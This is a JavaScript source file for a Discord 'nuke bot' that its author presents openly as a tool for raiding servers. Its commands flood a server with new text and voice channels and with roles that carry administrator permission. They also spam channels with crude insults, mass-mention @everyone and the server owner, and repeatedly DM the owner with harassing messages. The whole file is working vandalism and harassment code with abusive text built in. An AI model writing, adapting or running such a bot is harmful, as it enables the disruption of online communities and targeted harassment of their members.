const Discord = require('discord.js')
const client = new Discord.Client()
const count = require('../config.json').count
const prefix = require('../config.json').prefix
const token = require('../config.json').token

client.on('ready', () => {
    console.log(`Bot is Online. Enjoy Nuking!`)
})

client.on('message', (message) => {
    if(!message.content.startsWith(prefix) || message.author.bot){
        return
    }

    //Spliting the Command to an array
    const args = message.content.slice(prefix.length).split(/ +/)
    const command = args.shift().toLowerCase()

    if(command === 'help'){}
    else if(message.channel.type === 'dm'){
        console.log(command+' ran in DM\nErr: Cannot run commands in DM')
        message.reply('Err: Cannot run commands in DM (Only Help Command is permitted!)')
        return
    }

    console.log(command)

    if(command === 'textchannel'){
        message.delete()

        let categoryId = ''

        message.guild.channels.create('NUKE TIME', {type: 'category'})
        .then((channel) => {
            channel.setPosition(0)
            categoryId = channel.id
            channel.overwritePermissions([
                {
                    id: message.guild.id,
                    deny: ['SEND_MESSAGES'],
                    allow: ['ADD_REACTIONS', 'READ_MESSAGE_HISTORY']
                }
            ])
        })

        for(let i = 1; i<=count; i++){
            setTimeout(() => {
                message.guild.channels.create('😎nuke-bot_v1😎', {type: "text"})
                .then((channel) => {
                    channel.setParent(categoryId)
                    channel.send('GET NUKED BITCH. Nuke Bot#8332')
                })
            }, 500)
        }
    }
    else if(command === 'voicechannel'){
        message.delete()

        let categoryId = ''

        message.guild.channels.create('NUKE TIME', {type: 'category'})
        .then((channel) => {
            channel.setPosition(0)
            categoryId = channel.id
            channel.overwritePermissions([
                {
                    id: message.guild.id,
                    deny: ['CONNECT'],
                    allow: ['VIEW_CHANNEL']
                }
            ])
        })

        for(let i = 1; i<=count; i++){
            setTimeout(() => {
                message.guild.channels.create('😎NUKE BOT v1😎', {type: "voice"})
                .then((channel) => {
                    channel.setParent(categoryId)
                })
            }, 500)
        }
    }
    else if(command === 'spam'){
        message.delete()

        for(let i = 1; i<=count; i++){
            setTimeout(() => message.channel.send('YOU ARE NUKED NOOB 😂'), 200)
        }
    }
    else if(command === 'spamowner'){
        message.delete()

        for(let i = 1; i<=count; i++){
            setTimeout(() => message.channel.send(`GET NUKED OWNER 🤣<@${message.guild.ownerID}>`), 200)
        }
    }
    else if(command === 'spameveryone'){
        message.delete()

        for(let i = 1; i<=count; i++){
            setTimeout(() => message.channel.send(`GET NUKED NERDS\n@everyone **-->** 🤓 🤓 🤓\n`), 200)
        }
    }
    else if(command === 'dmowner'){
        message.delete()

        for(let i = 1; i<=count; i++){
            setTimeout(() => {
                message.guild.owner.send(`NERD (🤓) ===> <@${message.guild.owner.id}>\nYOUR PP SIZE --> B===D`)
            }, 200)
        }
    }
    else if(command === 'pp'){
        message.delete()

        for(let i = 1; i<=count; i++){
            setTimeout(() => message.channel.send(`@everyone YOUR PP ---> 8===D`), 200)
        }
    }
    else if(command === 'roles'){
        message.delete()

        let colors = ['#EE82EE', '#4B0082', '#0183fa', '#01d801', '#f7e501', '#fe8801', '#ff0000']
        let colorCount = 0;

        for(let i = 1; i <= count; i++){
            setTimeout(() => {
                message.guild.roles.create({data: {
                    name: '💣NUKED💣',
                    color: colors[colorCount],
                    hoist: true,
                    permissions: ['ADMINISTRATOR'],
                    mentionable: true
                }}).catch(console.error)

                colorCount++;
                if(colorCount === 7){
                    colorCount = 0
                }
            }, 250)
        }
    }
    else if(command === 'help'){
        if(message.channel.type === 'dm'){}
        else{
            message.delete()
        }

        const embed = new Discord.MessageEmbed()
            .setColor('#00cc00')
            .setThumbnail(message.author.avatarURL({dynamic: true}))
            .setDescription('Help command for server nuke bot')
            .addFields(
                {
                    name: `${prefix}textchannel`,
                    value: `Spam creates "${count} (count)" number of text channel/s`
                },
                {
                    name: `${prefix}voicechannel`,
                    value: `Spam creates "${count} (count)" number of voice channel/s`
                },
                {
                    name: `${prefix}spam`,
                    value: `Spams "${count} (count)" number of messages`
                },
                {
                    name: `${prefix}spamowner`,
                    value: `Spam tags the owner "${count} (count)" number of times`
                },
                {
                    name: `${prefix}spamwveryone`,
                    value: `Spam tags @everyone "${count} (count)" number of times`
                },
                {
                    name: `${prefix}dmowner`,
                    value: `Spam DMs owner "${count} (count)" number of times (Works only if the owner's DMs are open)`
                },
                {
                    name: `${prefix}pp`,
                    value: `Spams the server members PP size "${count} (count)" number of times (Doesn't include you ofcourse 😉)`
                },
                {
                    name: `${prefix}roles`,
                    value: `Spam creates a role "${count} (count)" number of times`
                },
                {
                    name: 'Suggestions?',
                    value: 'Send it to my e-mail --> pavel_kuznetsov2020@mail.ru'
                }
            )
            .setFooter(client.user.tag)
            .setTimestamp()
        message.author.send(embed)
    }
})

client.login(token).catch((err) => {
    console.error('Error',err)
    console.log('INVALID TOKEN!')
})